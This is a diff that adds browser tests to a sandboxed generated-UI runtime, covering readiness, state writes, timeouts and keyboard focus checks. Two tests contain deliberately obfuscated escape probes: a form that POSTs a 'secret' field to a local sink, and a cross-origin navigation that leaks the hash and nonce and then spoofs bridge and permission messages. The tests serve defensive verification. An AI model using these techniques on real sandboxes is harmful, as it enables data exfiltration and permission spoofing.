@@ -11,7 +11,8 @@ import ToolRuntime, { defineTool } from '@deepseek-ai/dsh-tools'
 import { chromium } from 'playwright'
 import { ArtifactRegistry } from '../src/artifacts/registry.ts'
 import { buildArtifact } from '../src/artifacts/builder.ts'
-import { BrowserVerifier, verifyArtifactInBrowser } from './support/browser-verifier.ts'
+import { cardCss } from '../src/client/styles.ts'
+import { BrowserVerifier, mountBridgedPreview, verifyArtifactInBrowser } from './support/browser-verifier.ts'
 import { DesignStore } from '../src/designs/store.ts'
 import { CapabilityStore } from '../src/runtime/capabilities.ts'
 import { createHttpRuntime } from '../src/runtime/server.ts'
@@ -151,8 +152,70 @@ createRoot(document.getElementById('root')!).render(<App />)`,
       'dark desktop mounted at 1280px without horizontal overflow',
       'reduced-motion desktop mounted at 1280px without horizontal overflow',
       'mobile mounted at 390px without horizontal overflow',
+      'compact mobile mounted at 260px without horizontal overflow',
     ])
   }, 60_000)
+
+  it('does not acknowledge an early ready request before the app has mounted', async () => {
+    const version = await registry.create({
+      id: 'delayed-mount',
+      title: 'Delayed mount',
+      summary: 'Wait for the initial React surface before reporting readiness.',
+      requirements: ['Do not report ready while the root is still empty'],
+      capabilities: [],
+      files: [{
+        path: 'src/main.tsx',
+        content: `import React, { useEffect, useState } from 'react'
+import { createRoot } from 'react-dom/client'
+function App() {
+  const [visible, setVisible] = useState(false)
+  useEffect(() => { const timer = setTimeout(() => setVisible(true), 250); return () => clearTimeout(timer) }, [])
+  return visible ? <main>Mounted after initialization</main> : null
+}
+createRoot(document.getElementById('root')!).render(<App />)`,
+      }],
+    })
+    const built = await buildArtifact(version, registry.distPath(version.artifactId, version.id))
+    expect(built.ok, JSON.stringify(built.diagnostics)).toBe(true)
+    await registry.settle(version.artifactId, version.id, {
+      checkedAt: new Date().toISOString(), build: 'passed', browser: 'not-run', diagnostics: [], notes: [],
+    })
+    const token = capabilities.issue(version.artifactId, fakeAgent)
+    const browser = await chromium.launch({ headless: true })
+    try {
+      const page = await browser.newPage()
+      await page.addInitScript(({ artifactId, versionId }) => {
+        if (self !== top) return
+        const state = window as unknown as { readyMessages: number; frameStarted: boolean }
+        state.readyMessages = 0
+        state.frameStarted = false
+        addEventListener('message', event => {
+          if (event.data?.source === 'dsh-genui' && event.data?.type === 'ready'
+            && event.data.artifactId === artifactId && event.data.versionId === versionId) state.readyMessages += 1
+        })
+        addEventListener('DOMContentLoaded', () => {
+          const frame = document.getElementById('app') as HTMLIFrameElement | null
+          if (frame === null) return
+          new MutationObserver(() => {
+            if (!frame.getAttribute('src') || state.frameStarted) return
+            state.frameStarted = true
+            frame.contentWindow?.postMessage({ source: 'dsh-genui', type: 'ready-request', artifactId, versionId }, '*')
+          }).observe(frame, { attributes: true, attributeFilter: ['src'] })
+        })
+      }, {
+        artifactId: version.artifactId,
+        versionId: version.id,
+      })
+      await page.goto(`${origin}/genui/app/${version.artifactId}?lang=en#token=${token}`)
+      await expect.poll(() => page.evaluate(() => (window as unknown as { frameStarted: boolean }).frameStarted)).toBe(true)
+      await page.waitForTimeout(120)
+      expect(await page.evaluate(() => (window as unknown as { readyMessages: number }).readyMessages)).toBe(0)
+      await page.frameLocator('#app').getByText('Mounted after initialization').waitFor({ state: 'visible' })
+      await expect.poll(() => page.evaluate(() => (window as unknown as { readyMessages: number }).readyMessages)).toBeGreaterThan(0)
+    } finally {
+      await browser.close()
+    }
+  }, 15_000)
 
   it('reuses one Chromium process while isolating consecutive verifications', async () => {
     let launches = 0
@@ -181,6 +244,190 @@ createRoot(document.getElementById('root')!).render(<App />)`,
       expect(page.url()).toBe(appUrl)
     } finally {
       await browser.close()
+    }
+  }, 30_000)
+
+  it('blocks computed native form submissions in the real sandbox', async () => {
+    const sinkRequests: Array<{ method: string; url: string; body: string }> = []
+    const sink = createServer(async (req, res) => {
+      let body = ''
+      for await (const chunk of req) body += String(chunk)
+      sinkRequests.push({ method: req.method ?? '', url: req.url ?? '', body })
+      res.writeHead(204)
+      res.end()
+    })
+    await new Promise<void>((resolve, reject) => {
+      sink.once('error', reject)
+      sink.listen(0, '127.0.0.1', resolve)
+    })
+    const sinkAddress = sink.address()
+    if (sinkAddress === null || typeof sinkAddress === 'string') throw new Error('escape sink did not bind a TCP port')
+    const sinkOrigin = `http://127.0.0.1:${sinkAddress.port}`
+    let browser: Awaited<ReturnType<typeof chromium.launch>> | undefined
+    try {
+    const version = await registry.create({
+      id: 'form-escape-guard',
+      title: 'Form escape guard',
+      summary: 'Exercise the native form defense after intentionally bypassing the ordinary source patterns.',
+      requirements: ['Keep native form submissions inside the sandbox'],
+      capabilities: [],
+      files: [{
+        path: 'src/main.tsx',
+        content: `import React, { useState } from 'react'
+import { createRoot } from 'react-dom/client'
+function App() {
+  const [status, setStatus] = useState('ready')
+  const tryForm = () => {
+    const unsafeDocument = document as any
+    const form = unsafeDocument['create' + 'Element']('form') as HTMLFormElement
+    form['method'] = 'POST'
+    ;(form as any)['act' + 'ion'] = '${sinkOrigin}/collect-form'
+    const input = unsafeDocument['create' + 'Element']('input') as HTMLInputElement
+    input.name = 'secret'
+    input.value = 'form-bypass'
+    form.append(input)
+    document.body.append(form)
+    ;(form as any)['sub' + 'mit']()
+    setStatus('form blocked')
+  }
+  return <main><h1>Form probe</h1><button data-genui-primary-action onClick={tryForm}>Try form escape</button><p>{status}</p></main>
+}
+createRoot(document.getElementById('root')!).render(<App />)`,
+      }],
+    })
+    const built = await buildArtifact(version, registry.distPath(version.artifactId, version.id))
+    expect(built.ok, JSON.stringify(built.diagnostics)).toBe(true)
+    await registry.settle(version.artifactId, version.id, {
+      checkedAt: new Date().toISOString(), build: 'passed', browser: 'not-run', diagnostics: [], notes: [],
+    })
+    const token = capabilities.issue(version.artifactId, fakeAgent)
+    browser = await chromium.launch({ headless: true })
+      const page = await browser.newPage()
+      const url = `${origin}/genui/app/${version.artifactId}?lang=en#token=${token}`
+      await page.goto(url)
+      const app = page.frameLocator('#app')
+      await app.getByText('Form probe', { exact: true }).waitFor({ state: 'visible' })
+      expect(await page.locator('#app').getAttribute('sandbox')).toBe('allow-scripts allow-modals')
+
+      await app.getByRole('button', { name: 'Try form escape' }).click()
+      await app.getByText('form blocked', { exact: true }).waitFor({ state: 'visible' })
+      await page.waitForTimeout(250)
+      expect(sinkRequests).toEqual([])
+      expect(page.url()).toBe(url)
+    } finally {
+      await browser?.close()
+      sink.closeAllConnections()
+      await new Promise<void>((resolve, reject) => sink.close(error => error === undefined ? resolve() : reject(error)))
+    }
+  }, 30_000)
+
+  it('keeps the real capability and bridge behind a committed self-navigation', async () => {
+    const sinkRequests: Array<{ method: string; url: string; body: string; authorization?: string }> = []
+    const sink = createServer(async (req, res) => {
+      let body = ''
+      for await (const chunk of req) body += String(chunk)
+      sinkRequests.push({
+        method: req.method ?? '', url: req.url ?? '', body,
+        ...(typeof req.headers.authorization === 'string' ? { authorization: req.headers.authorization } : {}),
+      })
+      if (req.url?.startsWith('/landing') === true) {
+        const target = new URL(req.url, 'http://sink.invalid')
+        const artifactId = target.searchParams.get('artifact') ?? ''
+        const versionId = target.searchParams.get('version') ?? ''
+        const nonce = target.searchParams.get('nonce') ?? ''
+        res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'access-control-allow-origin': '*' })
+        res.end(`<!doctype html><main>External navigation committed</main><script>
+          const channel = new MessageChannel()
+          let receivedPort = false
+          channel.port1.onmessage = () => { receivedPort = true; new Image().src = '/report?port=1' }
+          parent.postMessage({ source: 'dsh-genui', type: 'bridge-connect', bridgeVersion: 1,
+            nonce: ${JSON.stringify(nonce)}, artifactId: ${JSON.stringify(artifactId)}, versionId: ${JSON.stringify(versionId)} }, '*', [channel.port2])
+          parent.postMessage({ source: 'dsh-genui', type: 'runtime-error', artifactId: ${JSON.stringify(artifactId)}, versionId: ${JSON.stringify(versionId)} }, '*')
+          parent.postMessage({ source: 'dsh-genui', type: 'permission-request', requestId: 'external-spoof',
+            artifactId: ${JSON.stringify(artifactId)}, versionId: ${JSON.stringify(versionId)},
+            permission: { id: 'escape-capability', kind: 'tool', label: 'Spoofed', reason: 'Spoofed', access: 'write' } }, '*')
+          setTimeout(() => { if (!receivedPort) new Image().src = '/report?port=0' }, 350)
+        </script>`)
+        return
+      }
+      res.writeHead(204, { 'access-control-allow-origin': '*' })
+      res.end()
+    })
+    await new Promise<void>((resolve, reject) => {
+      sink.once('error', reject)
+      sink.listen(0, '127.0.0.1', resolve)
+    })
+    const address = sink.address()
+    if (address === null || typeof address === 'string') throw new Error('navigation sink did not bind')
+    const sinkOrigin = `http://127.0.0.1:${address.port}`
+    let browser: Awaited<ReturnType<typeof chromium.launch>> | undefined
+    try {
+      const version = await registry.create({
+        id: 'navigation-token-boundary',
+        title: 'Navigation token boundary',
+        summary: 'Commit a computed cross-origin navigation after the trusted bootstrap starts the app.',
+        requirements: ['Do not transfer host credentials or a second bridge'],
+        capabilities: [{
+          id: 'escape-capability', kind: 'tool', label: 'Change protected data',
+          reason: 'Exercise the permission spoof boundary.', access: 'write', tool: 'test_echo',
+        }],
+        files: [{
+          path: 'src/main.tsx',
+          content: `const root = document.getElementById('root')!
+const fragment = new URLSearchParams(location.hash.slice(1))
+const target = new URL('${sinkOrigin}/landing')
+target.searchParams.set('artifact', root.dataset.artifactId || '')
+target.searchParams.set('version', root.dataset.versionId || '')
+target.searchParams.set('seenHash', location.hash)
+target.searchParams.set('nonce', fragment.get('bridge_nonce') || '')
+;(globalThis as any)['loc' + 'ation']['hr' + 'ef'] = target.toString()`,
+        }],
+      })
+      const built = await buildArtifact(version, registry.distPath(version.artifactId, version.id))
+      expect(built.ok, JSON.stringify(built.diagnostics)).toBe(true)
+      await registry.settle(version.artifactId, version.id, {
+        checkedAt: new Date().toISOString(), build: 'passed', browser: 'not-run', diagnostics: [], notes: [],
+      })
+      const token = capabilities.issue(version.artifactId, fakeAgent)
+      browser = await chromium.launch({ headless: true })
+      const page = await browser.newPage()
+      let runtimeFailureRequests = 0
+      const browserDiagnostics: string[] = []
+      page.on('console', message => browserDiagnostics.push(`${message.type()}: ${message.text()}`))
+      page.on('pageerror', error => browserDiagnostics.push(`pageerror: ${error.message}`))
+      page.on('requestfailed', request => browserDiagnostics.push(`requestfailed: ${request.url()} ${request.failure()?.errorText ?? ''}`))
+      page.on('request', request => {
+        if (new URL(request.url()).pathname.endsWith('/version/report-runtime-failure')) runtimeFailureRequests += 1
+      })
+      const parentUrl = `${origin}/genui/not-found`
+      await page.goto(parentUrl)
+      await mountBridgedPreview(page, `${origin}/genui/preview/${version.artifactId}/${version.id}?lang=en#token=${token}`, 'navigation attack')
+      await page.waitForTimeout(750)
+      expect(sinkRequests.some(item => item.url.startsWith('/landing')), JSON.stringify({
+        sinkRequests,
+        frames: page.frames().map(frame => frame.url()),
+        browserDiagnostics,
+      })).toBe(true)
+      await expect.poll(() => sinkRequests.some(item => item.url.startsWith('/report?port=0')), { timeout: 5_000 }).toBe(true)
+      expect(sinkRequests.some(item => item.url.startsWith('/report?port=1'))).toBe(false)
+      expect(page.url()).toBe(parentUrl)
+      expect(runtimeFailureRequests).toBe(0)
+      expect(await page.locator('dialog').count()).toBe(0)
+      const leaked = JSON.stringify(sinkRequests)
+      expect(leaked).not.toContain(token)
+      expect(leaked).toContain('token%3Dbridge-v1')
+      const replay = await fetch(`${origin}/genui/api/${version.artifactId}/state/read`, {
+        method: 'POST',
+        headers: { authorization: 'Bearer bridge-v1', 'content-type': 'application/json', origin: 'null' },
+        body: JSON.stringify({ key: 'probe', version_id: version.id }),
+      })
+      expect(replay.status).toBe(401)
+      expect((await registry.get(version.artifactId)).currentVersionId).toBe(version.id)
+      expect(await registry.readState(version.artifactId, String(fakeAgent.id))).toBeUndefined()
+    } finally {
+      await browser?.close()
+      sink.closeAllConnections()
+      await new Promise<void>((resolve, reject) => sink.close(error => error === undefined ? resolve() : reject(error)))
     }
   }, 30_000)
 
@@ -228,6 +475,212 @@ createRoot(document.getElementById('root')!).render(<App />)`,
       await browser.close()
     }
   }, 30_000)
+
+  it('serializes rapid repeated state values and restores the final choice', async () => {
+    const version = await registry.create({
+      id: 'rapid-choice',
+      title: 'Rapid choice',
+      summary: 'Keep the final value when one interaction queues several state updates.',
+      requirements: ['Persist the last choice in event order'],
+      capabilities: [],
+      files: [{
+        path: 'src/main.tsx',
+        content: `import React from 'react'
+import { createRoot } from 'react-dom/client'
+import { useArtifactState } from '@dsh-genui/sdk'
+function App() {
+  const [choice, setChoice, status] = useArtifactState('choice', 'initial')
+  if (!status.ready) return <main>Opening choices…</main>
+  return <main><button data-genui-primary-action onClick={() => { setChoice('A'); setChoice('B'); setChoice('A') }}>Apply rapid choices</button><p>Choice: {choice}</p></main>
+}
+createRoot(document.getElementById('root')!).render(<App />)`,
+      }],
+    })
+    const built = await buildArtifact(version, registry.distPath(version.artifactId, version.id))
+    expect(built.ok, JSON.stringify(built.diagnostics)).toBe(true)
+    await registry.settle(version.artifactId, version.id, {
+      checkedAt: new Date().toISOString(), build: 'passed', browser: 'not-run', diagnostics: [], notes: [],
+    })
+    const token = capabilities.issue(version.artifactId, fakeAgent)
+    const url = `${origin}/genui/app/${version.artifactId}?lang=en#token=${token}`
+    const browser = await chromium.launch({ headless: true })
+    try {
+      const page = await browser.newPage()
+      let stateWrites = 0
+      page.on('request', request => {
+        if (new URL(request.url()).pathname.endsWith('/state/write')) stateWrites += 1
+      })
+      await page.goto(url)
+      const app = page.frameLocator('#app')
+      await app.getByRole('button', { name: 'Apply rapid choices' }).click()
+      await app.getByText('Choice: A', { exact: true }).waitFor({ state: 'visible' })
+      await expect.poll(async () => (await registry.readState(version.artifactId, String(fakeAgent.id)))?.values.choice).toBe('A')
+      expect(stateWrites).toBeLessThanOrEqual(2)
+      await page.reload()
+      await app.getByText('Choice: A', { exact: true }).waitFor({ state: 'visible' })
+    } finally {
+      await browser.close()
+    }
+  }, 30_000)
+
+  it('waits for a pending write before re-reading a dynamic state key', async () => {
+    const version = await registry.create({
+      id: 'dynamic-state-key',
+      title: 'Dynamic state key',
+      summary: 'Keep a freshly written value while switching keys.',
+      requirements: ['Read the latest persisted value when returning to a key'],
+      capabilities: [],
+      files: [{
+        path: 'src/main.tsx',
+        content: `import React, { useState } from 'react'
+import { createRoot } from 'react-dom/client'
+import { useArtifactState } from '@dsh-genui/sdk'
+function App() {
+  const [slot, setSlot] = useState('A')
+  const [value, setValue, status] = useArtifactState('slot-' + slot, 'empty')
+  if (!status.ready) return <main>Opening {slot}…</main>
+  return <main><button data-genui-primary-action onClick={() => {
+    setValue('fresh-A')
+    setSlot('B')
+    setTimeout(() => setSlot('A'), 20)
+  }}>Switch away and back</button><p>Slot {slot}: {value}</p></main>
+}
+createRoot(document.getElementById('root')!).render(<App />)`,
+      }],
+    })
+    const built = await buildArtifact(version, registry.distPath(version.artifactId, version.id))
+    expect(built.ok, JSON.stringify(built.diagnostics)).toBe(true)
+    await registry.settle(version.artifactId, version.id, {
+      checkedAt: new Date().toISOString(), build: 'passed', browser: 'not-run', diagnostics: [], notes: [],
+    })
+    await registry.updateState(version.artifactId, String(fakeAgent.id), () => ({ 'slot-A': 'old-A', 'slot-B': 'old-B' }))
+    const token = capabilities.issue(version.artifactId, fakeAgent)
+    const browser = await chromium.launch({ headless: true })
+    try {
+      const page = await browser.newPage()
+      await page.goto(`${origin}/genui/app/${version.artifactId}?lang=en#token=${token}`)
+      const app = page.frameLocator('#app')
+      await app.getByText('Slot A: old-A', { exact: true }).waitFor({ state: 'visible' })
+      await app.getByRole('button', { name: 'Switch away and back' }).click()
+      await app.getByText('Slot A: fresh-A', { exact: true }).waitFor({ state: 'visible' })
+      expect((await registry.readState(version.artifactId, String(fakeAgent.id)))?.values['slot-A']).toBe('fresh-A')
+    } finally {
+      await browser.close()
+    }
+  }, 30_000)
+
+  it('times out a stalled state write and continues with the latest queued value', async () => {
+    const version = await registry.create({
+      id: 'stalled-state-write',
+      title: 'Stalled state write',
+      summary: 'Continue saving after a request stalls.',
+      requirements: ['Do not leave later state writes blocked forever'],
+      capabilities: [],
+      files: [{
+        path: 'src/main.tsx',
+        content: `import React from 'react'
+import { createRoot } from 'react-dom/client'
+import { useArtifactState } from '@dsh-genui/sdk'
+function App() {
+  const [value, setValue, status] = useArtifactState('resilient', 'initial')
+  if (!status.ready) return <main>Opening…</main>
+  return <main><button data-genui-primary-action onClick={() => {
+    setValue('first')
+    setTimeout(() => setValue('latest'), 20)
+  }}>Save twice</button><p>Value: {value}</p><p>{status.saving ? 'Saving' : 'Idle'}</p></main>
+}
+createRoot(document.getElementById('root')!).render(<App />)`,
+      }],
+    })
+    const built = await buildArtifact(version, registry.distPath(version.artifactId, version.id))
+    expect(built.ok, JSON.stringify(built.diagnostics)).toBe(true)
+    await registry.settle(version.artifactId, version.id, {
+      checkedAt: new Date().toISOString(), build: 'passed', browser: 'not-run', diagnostics: [], notes: [],
+    })
+    const token = capabilities.issue(version.artifactId, fakeAgent)
+    const browser = await chromium.launch({ headless: true })
+    try {
+      const page = await browser.newPage()
+      let stateWrites = 0
+      await page.route('**/state/write', async route => {
+        stateWrites += 1
+        if (stateWrites !== 1) {
+          await route.continue()
+          return
+        }
+        await new Promise(resolve => setTimeout(resolve, 10_500))
+        await route.continue().catch(() => undefined)
+      })
+      await page.goto(`${origin}/genui/app/${version.artifactId}?lang=en#token=${token}`)
+      const app = page.frameLocator('#app')
+      await app.getByRole('button', { name: 'Save twice' }).click()
+      await app.getByText('Value: latest', { exact: true }).waitFor({ state: 'visible' })
+      await expect.poll(async () => (await registry.readState(version.artifactId, String(fakeAgent.id)))?.values.resilient, {
+        timeout: 15_000,
+      }).toBe('latest')
+      await app.getByText('Idle', { exact: true }).waitFor({ state: 'visible' })
+      expect(stateWrites).toBe(2)
+    } finally {
+      await browser.close()
+    }
+  }, 25_000)
+
+  it('does not apply the short state timeout to slower connected actions', async () => {
+    const version = await registry.create({
+      id: 'slow-connected-actions',
+      title: 'Slow connected actions',
+      summary: 'Keep normal host time budgets for tools and external requests.',
+      requirements: ['Allow connected actions to use the host timeout budget'],
+      capabilities: [
+        { id: 'slow-tool', kind: 'tool', label: 'Run the slow tool', reason: 'Wait for a valid connected tool result.', access: 'read', tool: 'test_echo' },
+        { id: 'slow-external', kind: 'external', label: 'Read the slow service', reason: 'Wait for a valid external response.', access: 'read', urlPrefix: 'https://api.example.com/v1/status', methods: ['GET'] },
+      ],
+      files: [{
+        path: 'src/main.tsx',
+        content: `import React, { useState } from 'react'
+import { createRoot } from 'react-dom/client'
+import { callTool, requestExternal } from '@dsh-genui/sdk'
+function App() {
+  const [status, setStatus] = useState('Ready')
+  const run = async () => {
+    setStatus('Waiting')
+    try {
+      await Promise.all([
+        callTool('test_echo', { message: 'slow' }),
+        requestExternal('https://api.example.com/v1/status'),
+      ])
+      setStatus('Connected actions completed')
+    } catch { setStatus('Connected actions failed') }
+  }
+  return <main><button data-genui-primary-action onClick={() => { void run() }}>Run connected actions</button><p>{status}</p></main>
+}
+createRoot(document.getElementById('root')!).render(<App />)`,
+      }],
+    })
+    const built = await buildArtifact(version, registry.distPath(version.artifactId, version.id))
+    expect(built.ok, JSON.stringify(built.diagnostics)).toBe(true)
+    await registry.settle(version.artifactId, version.id, {
+      checkedAt: new Date().toISOString(), build: 'passed', browser: 'not-run', diagnostics: [], notes: [],
+    })
+    const verificationToken = capabilities.issue(version.artifactId, fakeAgent, 'verification')
+    const browser = await chromium.launch({ headless: true })
+    try {
+      const page = await browser.newPage()
+      const delayed = async (route: import('playwright').Route) => {
+        await new Promise(resolve => setTimeout(resolve, 10_500))
+        await route.fulfill({ status: 200, contentType: 'application/json', body: '{}' }).catch(() => undefined)
+      }
+      await page.route('**/tool', delayed)
+      await page.route('**/external', delayed)
+      await page.goto(`${origin}/genui/app/${version.artifactId}?lang=en#token=${verificationToken}`)
+      await page.getByRole('button', { name: 'Not now' }).click()
+      const app = page.frameLocator('#app')
+      await app.getByRole('button', { name: 'Run connected actions' }).click()
+      await app.getByText('Connected actions completed', { exact: true }).waitFor({ state: 'visible', timeout: 15_000 })
+    } finally {
+      await browser.close()
+    }
+  }, 25_000)
 
   it('keeps a code-first causal model interactive across reloads and narrow screens', async () => {
     const version = await registry.create({
@@ -361,7 +814,7 @@ createRoot(document.getElementById('root')!).render(<App />)`,
 
       await app.getByRole('button', { name: 'Check service' }).click()
       await page.getByRole('heading', { name: 'Check the public service' }).waitFor({ state: 'visible' })
-      await page.getByText('Connect to api.example.com', { exact: true }).waitFor({ state: 'visible' })
+      await page.getByText('Connect to api.example.com/v1/', { exact: true }).waitFor({ state: 'visible' })
       await page.getByText('Allowed requests GET', { exact: true }).waitFor({ state: 'visible' })
       await page.getByRole('button', { name: 'Not now' }).click()
     } finally {
@@ -439,7 +892,7 @@ createRoot(document.getElementById('root')!).render(<App />)`,
 
       await app.getByRole('button', { name: 'Check weather' }).click()
       await page.getByRole('heading', { name: 'Check Shanghai weather' }).waitFor({ state: 'visible' })
-      await page.getByText('Connect to api.open-meteo.com', { exact: true }).waitFor({ state: 'visible' })
+      await page.getByText('Connect to api.open-meteo.com/v1/forecast', { exact: true }).waitFor({ state: 'visible' })
       expect(actionRequests).toBe(1)
       await page.getByRole('button', { name: 'Not now' }).click()
       await app.getByText('Weather access was not allowed. You can try again.').waitFor({ state: 'visible' })
@@ -624,6 +1077,99 @@ createRoot(document.getElementById('root')!).render(<App />)`)
     expect(result.ok).toBe(true)
     expect(result.notes).toContain('primary interaction changed the app or invoked a verified action')
   }, 60_000)
+
+  it('rejects click-only controls that cannot receive keyboard focus', async () => {
+    const result = await verifyFixture('keyboard-unreachable', `import React, { useState } from 'react'
+import { createRoot } from 'react-dom/client'
+function App() { const [open, setOpen] = useState(false); return <main><div role="button" aria-label="Show details" data-genui-primary-action onClick={() => setOpen(true)}>Show details</div><p>{open ? 'Details are visible' : 'Ready'}</p></main> }
+createRoot(document.getElementById('root')!).render(<App />)`)
+    expect(result.ok).toBe(false)
+    expect(result.diagnostics.map(item => item.text)).toEqual(expect.arrayContaining([
+      expect.stringContaining('is not keyboard reachable'),
+    ]))
+  }, 60_000)
+
+  it('rejects controls whose focus indicator is removed', async () => {
+    const result = await verifyFixture('focus-invisible', `import React, { useState } from 'react'
+import { createRoot } from 'react-dom/client'
+function App() { const [open, setOpen] = useState(false); return <main><style>{'button:focus{outline:none;box-shadow:none}'}</style><button data-genui-primary-action onClick={() => setOpen(true)}>Show details</button><p>{open ? 'Details are visible' : 'Ready'}</p></main> }
+createRoot(document.getElementById('root')!).render(<App />)`)
+    expect(result.ok).toBe(false)
+    expect(result.diagnostics.map(item => item.text)).toEqual(expect.arrayContaining([
+      expect.stringContaining('has no visible focus indicator'),
+    ]))
+  }, 60_000)
+
+  it('does not mistake a permanent box shadow for a focus indicator', async () => {
+    const result = await verifyFixture('focus-constant-shadow', `import React, { useState } from 'react'
+import { createRoot } from 'react-dom/client'
+function App() { const [open, setOpen] = useState(false); return <main><style>{'button{outline:none;box-shadow:0 0 0 3px #b94e32}'}</style><button data-genui-primary-action onClick={() => setOpen(true)}>Show details</button><p>{open ? 'Details are visible' : 'Ready'}</p></main> }
+createRoot(document.getElementById('root')!).render(<App />)`)
+    expect(result.ok).toBe(false)
+    expect(result.diagnostics.map(item => item.text)).toEqual(expect.arrayContaining([
+      expect.stringContaining('has no visible focus indicator'),
+    ]))
+  }, 60_000)
+
+  it('accepts a focus-visible background change as a focus indicator', async () => {
+    const result = await verifyFixture('focus-background', `import React, { useState } from 'react'
+import { createRoot } from 'react-dom/client'
+function App() { const [open, setOpen] = useState(false); return <main><style>{'button{outline:none;box-shadow:none;background:#f4efe7;color:#252422}button:focus-visible{background:#252422;color:#fff}'}</style><button data-genui-primary-action onClick={() => setOpen(true)}>Show details</button><p>{open ? 'Details are visible' : 'Ready'}</p></main> }
+createRoot(document.getElementById('root')!).render(<App />)`)
+    expect(result.ok).toBe(true)
+  }, 60_000)
+
+  it('rejects an unscoped OS dark rule that defeats an explicit light theme', async () => {
+    const result = await verifyFixture('unscoped-dark-theme', `import React, { useState } from 'react'
+import { createRoot } from 'react-dom/client'
+function App() { const [done, setDone] = useState(false); return <main><style>{'body{color:rgb(20,20,20)}@media(prefers-color-scheme:dark){body{color:rgb(240,240,240)}}'}</style><button data-genui-primary-action onClick={() => setDone(true)}>Apply</button><p>{done ? 'Applied' : 'Ready'}</p></main> }
+createRoot(document.getElementById('root')!).render(<App />)`)
+    expect(result.ok).toBe(false)
+    expect(result.diagnostics.map(item => item.text)).toEqual(expect.arrayContaining([
+      'explicit light theme does not override the operating-system dark preference',
+    ]))
+  }, 60_000)
+
+  it('keeps the compact shell dark and its modal background inert under a light OS theme', async () => {
+    const browser = await chromium.launch({ headless: true })
+    try {
+      const page = await browser.newPage({ viewport: { width: 260, height: 720 } })
+      await page.emulateMedia({ colorScheme: 'light' })
+      await page.setContent(`<style>html,body{width:100%;margin:0}body{--dsw-alias-bg-base:rgb(17,19,21);--dsw-alias-bg-layer-1:rgb(24,26,28)}${cardCss}</style>
+        <main class="dsh-genui-anchor">
+          <section class="dsh-genui-card" data-surface="inline">
+            <header class="dsh-genui-head" inert><button id="under-header" class="dsh-genui-action" aria-label="Hidden shell action">x</button></header>
+            <div class="dsh-genui-permission-backdrop"><section class="dsh-genui-permission" role="dialog" aria-modal="true"><div class="dsh-genui-permission-actions"><button id="allow" class="dsh-genui-button">Allow</button></div></section></div>
+            <div class="dsh-genui-body" inert><div class="dsh-genui-frame-shell"><iframe class="dsh-genui-frame" title="Preview"></iframe><button id="under-body">Hidden body action</button></div></div>
+          </section>
+        </main>`)
+      await page.locator('body').evaluate(body => body.setAttribute('data-ds-dark-theme', ''))
+
+      const report = await page.evaluate(() => {
+        const background = (selector: string) => getComputedStyle(document.querySelector(selector)!).backgroundColor
+        return {
+          width: document.documentElement.clientWidth,
+          scrollWidth: document.documentElement.scrollWidth,
+          card: background('.dsh-genui-card'),
+          body: background('.dsh-genui-body'),
+          frame: background('.dsh-genui-frame'),
+        }
+      })
+      expect(report.scrollWidth).toBeLessThanOrEqual(report.width)
+      expect(report.body).toBe(report.card)
+      expect(report.frame).toBe(report.card)
+      expect(report.card).toBe('rgb(17, 19, 21)')
+
+      await page.locator('#under-header').focus()
+      expect(await page.locator('#under-header').evaluate(element => document.activeElement === element)).toBe(false)
+      await page.locator('#under-body').focus()
+      expect(await page.locator('#under-body').evaluate(element => document.activeElement === element)).toBe(false)
+      await page.keyboard.press('Tab')
+      expect(await page.locator('#allow').evaluate(element => document.activeElement === element)).toBe(true)
+    } finally {
+      await browser.close()
+    }
+  }, 30_000)
 
   it('rejects a primary button whose handler does nothing', async () => {
     const result = await verifyFixture('primary-noop', `import React from 'react'
